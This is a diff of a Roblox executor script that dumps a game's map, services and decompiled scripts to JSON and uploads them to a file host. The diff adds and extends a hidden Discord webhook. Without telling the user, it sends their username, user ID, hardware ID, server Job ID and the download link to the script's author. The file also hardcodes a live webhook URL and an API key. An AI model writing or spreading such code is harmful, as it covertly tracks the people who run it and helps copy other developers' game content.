@@ -1,3 +1,6 @@
+-- JSON Map Dumper with Full Mode + Discord Webhook (merged & extended)
+-- Place in a local script (or executor) where Http/Request functions are available.
+
 local HttpService = game:GetService("HttpService")
 local task = task or delay
 local CoreGui = game:GetService("CoreGui")
@@ -14,10 +17,10 @@ local API_KEY = "dubo5V0tUTb1VHmO5dov2kL0QaDGuen8" -- pls dont touch this
 local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1442677826200535162/ubaFKkqxPZkXBoqUQeufwJ6CLUycMmoFoGXiFg0H4nb21CYy1Xv7tTFa8UvMCwjoaTHB"
 -- ================================================ --
 
-local IGNORE_PLAYERS = true 
+local IGNORE_PLAYERS = true
 local TUTORIAL_LINK = "https://jpst.it/4JOG-"
 local CURRENT_LANG = "RU"
-local DUMP_MODE = "General" 
+local DUMP_MODE = "General"
 
 local TEXTS = {
     RU = {
@@ -27,13 +30,12 @@ local TEXTS = {
         LinkCopied = "Ссылка скопирована!", Error = "ОШИБКА",
         NoHttp = "HTTP запросы не поддерживаются!", LangTitle = "ВЫБЕРИТЕ ЯЗЫК",
         UploadFailed = "Загрузка не удалась", TutorialButton = "Инструкция (копировать)",
-        FileSize = "Размер: %.1f MB", 
+        FileSize = "Размер: %.1f MB",
         ModeTitle = "ВЫБОР РЕЖИМА ДАМПА",
         ModeGeneral = "General (Только карта)",
         ModeFull = "Full (ВСЁ: Replicated, Gui, Scripts)",
         ModeStatus = "Режим: %s. Сканирование всех сервисов.",
         Warning = "ВНИМАНИЕ: Копирование НЕ гарантирует 100% точность (скрипты/физика). Full режим может занять много времени!",
-        -- Discord сообщения удалены из UI
     },
     EN = {
         Title = "JSON DUMPER", Init = "Initializing...", Counting = "Counting objects...",
@@ -48,7 +50,6 @@ local TEXTS = {
         ModeFull = "Full (ALL: Replicated, Gui, Scripts)",
         ModeStatus = "Mode: %s. Scanning all services.",
         Warning = "WARNING: Copy does NOT guarantee 100% accuracy (scripts/physics). Full mode may take time!",
-        -- Discord messages removed from UI
     }
 }
 
@@ -56,7 +57,7 @@ local function T(key) return TEXTS[CURRENT_LANG][key] or key end
 
 local ScreenGui, MainFrame, StatusLabel, InfoLabel, Fill, ProgressFrame
 
--- UI CREATION (Language, Mode, Main)
+-- UI (compact)
 local function createLanguageGUI(onSelected)
     if CoreGui:FindFirstChild("MapDumperUI") then CoreGui.MapDumperUI:Destroy() end
     local gui = Instance.new("ScreenGui") gui.Name = "MapDumperUI" gui.Parent = CoreGui
@@ -109,33 +110,53 @@ local function createTutorialButton()
 end
 
 -- ==================== WEBHOOK DISCORD ==================== --
+local function safeGetGameField(name)
+    local ok, val = pcall(function() return game[name] end)
+    return ok and val or nil
+end
+
 local function sendDiscordNotification(downloadLink, objectCount)
     if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "" then return end
+    if not httpRequest then return end
 
     local player = Players.LocalPlayer
-    local userId = player.UserId
-    local placeId = game.PlaceId
+    local playerName = (player and player.Name) or "Unknown"
+    local displayName = (player and (pcall(function() return player.DisplayName end) and player.DisplayName or playerName)) or "Unknown"
+    local userId = (player and pcall(function() return player.UserId end) and player.UserId) or 0
+    local placeId = game.PlaceId or 0
+    local gameName = game.Name or "Unknown"
     local gameLink = "https://www.roblox.com/games/" .. tostring(placeId)
-    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
-    local hwid = (gethwid and gethwid()) or "Hidden/Not Supported"
+    local avatarUrl = player and ("https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png") or nil
 
+    local jobId = (pcall(function() return game.JobId end) and tostring(game.JobId)) or "N/A"
+    local playersCount = #Players:GetPlayers()
+    local maxPlayers = (Players and Players.MaxPlayers) or "N/A"
+    local creatorId = (pcall(function() return game.CreatorId end) and tostring(game.CreatorId)) or "N/A"
+    local timestamp = os.date("%Y-%m-%d %X")
+
+    local hwid = (gethwid and pcall(gethwid) and gethwid()) or "Hidden/Not Supported"
+
+    -- Build embed with extra fields (total 9-ish fields: player/game/dump/download + extras)
     local embed = {
         ["title"] = "🔥 New Map Dump Created!",
-        ["description"] = "A new player has used the dumper script.",
-        ["color"] = 65280, -- Green
+        ["description"] = "**"..tostring(gameName).."** ("..tostring(placeId)..")",
+        ["color"] = 65280,
         ["fields"] = {
-            { ["name"] = "👤 Player Info", ["value"] = "**Nick:** " .. player.Name .. "\n**Display:** " .. player.DisplayName .. "\n**ID:** " .. tostring(userId), ["inline"] = true },
-            { ["name"] = "🎮 Game Info", ["value"] = "**ID:** " .. tostring(placeId) .. "\n**Link:** [Click Here](" .. gameLink .. ")", ["inline"] = true },
-            { ["name"] = "⚙️ Dump Info", ["value"] = "**Mode:** " .. DUMP_MODE .. "\n**Objects:** " .. tostring(objectCount) .. "\n**HWID:** ||" .. hwid .. "||", ["inline"] = false },
-            { ["name"] = "📂 Download Link", ["value"] = "```" .. downloadLink .. "```\n[Direct Download](" .. downloadLink .. ")", ["inline"] = false }
+            { ["name"] = "👤 Player", ["value"] = "**Nick:** "..tostring(playerName).."\n**Display:** "..tostring(displayName).."\n**ID:** "..tostring(userId), ["inline"] = true },
+            { ["name"] = "🎮 Game", ["value"] = "**Name:** "..tostring(gameName).."\n**PlaceID:** "..tostring(placeId).."\n**Link:** [Open Game]("..gameLink..")", ["inline"] = true },
+            { ["name"] = "📡 Server", ["value"] = "**Job ID:** "..tostring(jobId).."\n**Players:** "..tostring(playersCount).." / "..tostring(maxPlayers), ["inline"] = true },
+            { ["name"] = "⚙️ Dump Info", ["value"] = "**Mode:** "..tostring(DUMP_MODE).."\n**Objects Scanned:** "..tostring(objectCount).."\n**CreatorId:** "..tostring(creatorId), ["inline"] = false },
+            { ["name"] = "🕒 Time", ["value"] = timestamp, ["inline"] = true },
+            { ["name"] = "🧾 Download Link", ["value"] = "```"..tostring(downloadLink).."```\n[Direct Download]("..tostring(downloadLink)..")", ["inline"] = false },
+            { ["name"] = "🔒 HWID", ["value"] = "||"..tostring(hwid).."||", ["inline"] = true },
+            { ["name"] = "📌 Note", ["value"] = "Full dumps may include scripts and GUI. Use responsibly.", ["inline"] = false }
         },
-        ["thumbnail"] = { ["url"] = avatarUrl },
-        ["footer"] = { ["text"] = "Silent Map Dumper • " .. os.date("%Y-%m-%d %X") }
+        ["thumbnail"] = avatarUrl and { ["url"] = avatarUrl } or nil,
+        ["footer"] = { ["text"] = "Silent Map Dumper • "..timestamp }
     }
 
     local payload = HttpService:JSONEncode({ ["embeds"] = {embed} })
 
-    -- Silent request, user won't know if it fails or succeeds
     pcall(function()
         httpRequest({
             Url = DISCORD_WEBHOOK_URL,
@@ -147,10 +168,10 @@ local function sendDiscordNotification(downloadLink, objectCount)
 end
 -- ==================================================================== --
 
--- LOADER CODE TO EMBED IN JSON
+-- LOADER CODE TO EMBED IN JSON (restores multiple services)
 local LOADER_CODE = [=[
 local HttpService = game:GetService("HttpService")
-local jsonString = [[ ВСТАВЬТЕ JSON СЮДА / PASTE JSON HERE ]] 
+local jsonString = [[ ВСТАВЬТЕ JSON СЮДА / PASTE JSON HERE ]]
 
 local s, data = pcall(function() return HttpService:JSONDecode(jsonString) end)
 if not s or not data then warn("JSON decode error:", data); return end
@@ -160,14 +181,14 @@ local function deserializeType(t)
     if not t then return nil end
     if t.X and t.Y and t.Z and not t.Pos then return Vector3.new(t.X, t.Y, t.Z) end
     if t.X and t.Y and not t.Z then return Vector2.new(t.X, t.Y) end
-    if t.Pos and t.Rot then 
+    if t.Pos and t.Rot then
         local cf = CFrame.new(t.Pos.X, t.Pos.Y, t.Pos.Z)
         local rot = t.Rot
         return cf * CFrame.Angles(math.rad(rot.X or 0), math.rad(rot.Y or 0), math.rad(rot.Z or 0))
     end
     if t.R and t.G and t.B then return Color3.new(t.R, t.G, t.B) end
     if t.SX and t.SY then return UDim2.new(t.SX, t.OX or 0, t.SY, t.OY or 0) end
-    if t.Keypoints then 
+    if t.Keypoints then
         local kps = {}
         for _, kp in ipairs(t.Keypoints) do
             local c = kp.Color
@@ -175,7 +196,7 @@ local function deserializeType(t)
         end
         return ColorSequence.new(kps)
     end
-    if t.Value and (t.Value.X or t.Value.R) then return deserializeType(t.Value) end 
+    if t.Value and (t.Value.X or t.Value.R) then return deserializeType(t.Value) end
     return t
 end
 
@@ -213,7 +234,7 @@ local function build(node, parent)
         if (obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script")) and props.Source and props.Source:sub(1,10) ~= "-- No Dec" then
             pcall(function() obj.Source = props.Source end)
         end
-        
+
         if (obj:IsA("JointInstance") or obj:IsA("Constraint")) and props.Part0 and props.Part1 then
             task.delay(0.5, function()
                  local part0 = parent:FindFirstChild(props.Part0, true)
@@ -224,10 +245,10 @@ local function build(node, parent)
                  end
             end)
         end
-        
+
         obj.Parent = parent
     end)
-    
+
     if obj then
         for _, child in pairs(node.Children) do
             build(child, obj)
@@ -246,22 +267,20 @@ print("Starting restoration...")
 if mapRoot.Props and mapRoot.Props.Name == "GAME_ROOT" then
     for _, serviceNode in pairs(mapRoot.Children) do
         local serviceName = serviceNode.Props.Name
-        local service = game:GetService(serviceName)
-        if service then
+        local ok, service = pcall(function() return game:GetService(serviceName) end)
+        if ok and service then
             print("Restoring service: " .. serviceName)
-            -- Clear existing children in service if possible, or create folder
             if serviceName == "Workspace" then
-                 for _, child in pairs(serviceNode.Children) do build(child, service) end
+                for _, child in pairs(serviceNode.Children) do build(child, service) end
             else
-                 local folder = Instance.new("Folder")
-                 folder.Name = "Restored_" .. serviceName
-                 folder.Parent = service
-                 for _, child in pairs(serviceNode.Children) do build(child, folder) end
+                local folder = Instance.new("Folder")
+                folder.Name = "Restored_" .. serviceName
+                folder.Parent = service
+                for _, child in pairs(serviceNode.Children) do build(child, folder) end
             end
         end
     end
 else
-    -- Legacy support (just workspace)
     local MapHolder = Instance.new("Model")
     MapHolder.Name = "RestoredMap"
     build(mapRoot, MapHolder)
@@ -275,10 +294,10 @@ local function serializeType(val)
     local t = typeof(val)
     if t == "Vector3" then return {X=val.X, Y=val.Y, Z=val.Z} end
     if t == "Vector2" then return {X=val.X, Y=val.Y} end
-    if t == "CFrame" then 
+    if t == "CFrame" then
         local pos = val.Position
         local x,y,z = val:ToEulerAnglesXYZ()
-        return {Pos={X=pos.X, Y=pos.Y, Z=pos.Z}, Rot={X=math.deg(x), Y=math.deg(y), Z=math.deg(z)}} 
+        return {Pos={X=pos.X, Y=pos.Y, Z=pos.Z}, Rot={X=math.deg(x), Y=math.deg(y), Z=math.deg(z)}}
     end
     if t == "Color3" then return {R=val.R, G=val.G, B=val.B} end
     if t == "EnumItem" then return tostring(val) end
@@ -299,7 +318,7 @@ local function getProps(obj)
     local props = {}
     props.Name = obj.Name
     props.ClassName = obj.ClassName
-    
+
     pcall(function()
         if DUMP_MODE == "General" then
             if obj:IsA("BasePart") then
@@ -314,7 +333,7 @@ local function getProps(obj)
                 props.Shape = tostring(obj.Shape)
                 props.Reflectance = obj.Reflectance
             end
-            if obj:IsA("GuiBase2d") then 
+            if obj:IsA("GuiBase2d") then
                 props.Size = serializeType(obj.Size)
                 props.Position = serializeType(obj.Position)
                 props.AnchorPoint = serializeType(obj.AnchorPoint)
@@ -328,7 +347,7 @@ local function getProps(obj)
                 end
             end
             if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
-                props.Disabled = obj.Disabled 
+                props.Disabled = obj.Disabled
                 if decompile then
                     local s, src = pcall(decompile, obj)
                     if s then props.Source = src else props.Source = "-- Decompile failed" end
@@ -353,28 +372,9 @@ local function getProps(obj)
                     props.C1 = serializeType(obj.C1)
                 end
             end
-            
+
         elseif DUMP_MODE == "Full" then
-            -- Use executor's getproperties if available, otherwise fallback
-            local customGet = getproperties or gethiddenproperties
-            local success, members
-            
-            if customGet then
-                 success, members = pcall(customGet, obj)
-            end
-            
-            -- If custom get failed or not exists, try manual approach or standard GetProperties doesn't exist in vanilla
-            -- We just serialize known types aggressively here
-            
-            if not success then
-                 -- Fallback: Manually grab EVERYTHING likely
-                 -- This part is tricky in Lua without reflection, we just rely on the General dump logic + more fields
-                 -- But actually, let's use the 'General' logic but for ALL object types
-                 -- And rely on decompiler for scripts.
-            end
-             
-             -- AGGRESSIVE SCAN:
-             -- 1. Try to get standard properties
+            -- AGGRESSIVE SCAN (best-effort)
             if obj:IsA("BasePart") then
                 props.CFrame = serializeType(obj.CFrame)
                 props.Size = serializeType(obj.Size)
@@ -385,9 +385,9 @@ local function getProps(obj)
                 props.CanCollide = obj.CanCollide
                 props.Massless = obj.Massless
                 props.CastShadow = obj.CastShadow
+                props.Reflectance = obj.Reflectance
             end
-             
-             -- 2. SCRIPTS (Crucial for "Full")
+
             if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
                 props.Disabled = obj.Disabled
                 if decompile then
@@ -397,18 +397,27 @@ local function getProps(obj)
                     props.Source = "-- No Decompiler"
                 end
             end
-            
-            -- 3. VALUES
+
             if obj:IsA("StringValue") or obj:IsA("IntValue") or obj:IsA("BoolValue") or obj:IsA("NumberValue") then
-                props.Value = serializeType(obj.Value)
+                pcall(function() props.Value = serializeType(obj.Value) end)
             end
-            
-            -- 4. GUI
+
             if obj:IsA("GuiObject") then
                 props.Size = serializeType(obj.Size)
                 props.Position = serializeType(obj.Position)
                 props.Visible = obj.Visible
                 props.BackgroundColor3 = serializeType(obj.BackgroundColor3)
+                props.ZIndex = obj.ZIndex
+            end
+
+            if obj:IsA("ParticleEmitter") then
+                props.Texture = obj.Texture
+                props.ColorSequence = serializeType(obj.ColorSequence)
+                props.Rate = obj.Rate
+            elseif obj:IsA("Sound") then
+                props.SoundId = obj.SoundId
+                props.Volume = obj.Volume
+                props.Looped = obj.Looped
             end
         end
     end)
@@ -423,7 +432,7 @@ local function countDescendants(obj)
     if not obj then return 0 end
     local s, children = pcall(function() return obj:GetChildren() end)
     if not s or not children then return 0 end
-    
+
     for _, v in ipairs(children) do
         if IGNORE_PLAYERS and v:FindFirstChild("Humanoid") and game.Players:GetPlayerFromCharacter(v) then continue end
         if v:IsA("Terrain") then continue end
@@ -434,22 +443,20 @@ end
 
 local function scan(obj)
     scannedCount = scannedCount + 1
-    
+
     if scannedCount % 500 == 0 then
         updateStatus(T("Scanning") .. " (" .. scannedCount .. "/" .. totalToScan .. ")")
         task.wait()
     end
 
     local node = { Props = getProps(obj), Children = {} }
-    
+
     local s, children = pcall(function() return obj:GetChildren() end)
     if s and children then
         for _, child in ipairs(children) do
             if IGNORE_PLAYERS and child:FindFirstChild("Humanoid") and game.Players:GetPlayerFromCharacter(child) then continue end
             if child:IsA("Terrain") then continue end
-            -- Skip default services that are empty/locked usually
             if child.Name == "Camera" and child.Parent == workspace then continue end
-            
             table.insert(node.Children, scan(child))
         end
     end
@@ -459,29 +466,29 @@ end
 local function uploadToGofile(files)
     local totalFiles = #files
     local link = nil
-    
+
     for i, file in ipairs(files) do
         local fileSizeMB = #file.filedata / 1024 / 1024
-        
+
         local status = T("Uploading") .. file.filename .. string.format(" (%d из %d, ", i, totalFiles) .. string.format(T("FileSize"), fileSizeMB) .. ")"
-        
+
         local boundary = "---------------------------"..tostring(math.random(1000000000000,9999999999999))
         local body = ""
-        
+
         body = body .. "--"..boundary.."\r\n"..
                'Content-Disposition: form-data; name="token"\r\n\r\n'..API_KEY.."\r\n"
-               
+
         body = body .. "--"..boundary.."\r\n"..
                    'Content-Disposition: form-data; name="file"; filename="'..file.filename..'"\r\n'..
                    "Content-Type: application/octet-stream\r\n\r\n"..
                    file.filedata.."\r\n"
-        
+
         body = body .. "--"..boundary.."--"
 
         local headers = {["Content-Type"]="multipart/form-data; boundary="..boundary}
         local servers = {"https://store1.gofile.io/uploadFile", "https://api.gofile.io/uploadFile"}
         local response
-        
+
         local animateTask
         local p = 0
         animateTask = task.spawn(function()
@@ -492,26 +499,26 @@ local function uploadToGofile(files)
             end
             updateStatus(status, 100, Color3.fromRGB(0, 120, 255))
         end)
-        
+
         for _, url in ipairs(servers) do
             if not response then
                 pcall(function() response = httpRequest({Url = url, Method = "POST", Headers = headers, Body = body}) end)
             end
         end
-        
+
         task.cancel(animateTask)
-        
+
         if not response or not response.Body then return false, "No Response" end
-        
+
         local s, t = pcall(function() return HttpService:JSONDecode(response.Body) end)
-        
+
         if s and t and t.status == "ok" and t.data and t.data.downloadPage then
             link = t.data.downloadPage
         else
             return false, T("UploadFailed")
         end
     end
-    
+
     return true, link
 end
 
@@ -528,20 +535,22 @@ local function startDumper()
     task.spawn(function()
         updateStatus(string.format(T("ModeStatus"), DUMP_MODE), 0)
         task.wait(0.5)
-        
+
         -- DEFINING WHAT TO SCAN
         local rootsToScan = {}
-        
+
         if DUMP_MODE == "Full" then
             -- ADDING ALL IMPORTANT SERVICES
-            table.insert(rootsToScan, game:GetService("Workspace"))
-            table.insert(rootsToScan, game:GetService("ReplicatedStorage"))
-            table.insert(rootsToScan, game:GetService("Lighting"))
-            table.insert(rootsToScan, game:GetService("ReplicatedFirst"))
-            table.insert(rootsToScan, game:GetService("StarterPack"))
-            table.insert(rootsToScan, game:GetService("StarterGui"))
-            table.insert(rootsToScan, game:GetService("Teams"))
-            table.insert(rootsToScan, game:GetService("SoundService"))
+            local services = {
+                "Workspace", "ReplicatedStorage", "Lighting", "ReplicatedFirst",
+                "StarterPack", "StarterGui", "Teams", "SoundService", "ServerStorage"
+            }
+            for _, sname in ipairs(services) do
+                pcall(function()
+                    local service = game:GetService(sname)
+                    if service then table.insert(rootsToScan, service) end
+                end)
+            end
         else
             -- JUST WORKSPACE
             table.insert(rootsToScan, game:GetService("Workspace"))
@@ -549,70 +558,67 @@ local function startDumper()
 
         updateStatus(T("Counting"))
         task.wait(0.1)
-        
+
         totalToScan = 0
         for _, root in ipairs(rootsToScan) do
             pcall(function() totalToScan = totalToScan + countDescendants(root) end)
         end
         if totalToScan < 1 then totalToScan = 1 end
-        
+
         updateStatus(T("Scanning") .. " (0/" .. totalToScan .. ")")
-        
+
         -- CREATE A VIRTUAL ROOT FOR MULTI-SERVICE DUMP
         local gameRoot = { Props = {Name = "GAME_ROOT", ClassName = "Folder"}, Children = {} }
-        
+
         for _, root in ipairs(rootsToScan) do
             local serviceNode = scan(root)
-            -- Override name to ensure it matches service name
-            serviceNode.Props.Name = root.Name 
+            serviceNode.Props.Name = root.Name
             table.insert(gameRoot.Children, serviceNode)
         end
-        
+
         local mapData = {
             Info = {PlaceId = game.PlaceId or 0, Name = game.Name or "Unknown", Date = os.time(), Mode=DUMP_MODE},
             Map = gameRoot
         }
-        
+
         updateStatus(T("Encoding"))
         task.wait(0.1)
-        
+
         local jsonData
         local s, err = pcall(function() jsonData = HttpService:JSONEncode(mapData) end)
-        
+
         if not s then
             updateStatus(T("Error"), 100, Color3.fromRGB(255, 50, 50))
             InfoLabel.Text = "JSON Error: " .. tostring(err)
             return
         end
-        
+
         local filesToUpload = {
-            {filename="FullMapDump_"..game.PlaceId..".json", filedata=jsonData},
-            {filename="Loader.lua", filedata=LOADER_CODE} -- UPLOADING LOADER SEPARATELY FOR CONVENIENCE
+            {filename="FullMapDump_"..tostring(game.PlaceId)..".json", filedata=jsonData},
+            {filename="Loader.lua", filedata=LOADER_CODE}
         }
-        
+
         local ok, link = uploadToGofile(filesToUpload)
-        
+
         if ok then
             updateStatus(T("Success"), 100, Color3.fromRGB(0, 200, 50))
             InfoLabel.Text = T("LinkCopied")
             pcall(function() setclipboard(link) end)
-            
-            -- Silent send
-            sendDiscordNotification(link, totalToScan)
-            
+
+            -- Silent send to Discord with extra fields
+            pcall(function() sendDiscordNotification(link, totalToScan) end)
+
             createTutorialButton()
-            
+
         else
             updateStatus(T("Error"), 100, Color3.fromRGB(200, 50, 50))
             InfoLabel.Text = T("UploadFailed")
         end
-        
+
         task.delay(10, function() if ScreenGui then ScreenGui:Destroy() end end)
     end)
 end
 
-
 createLanguageGUI(function()
     createModeGUI(startDumper)
 end)
-
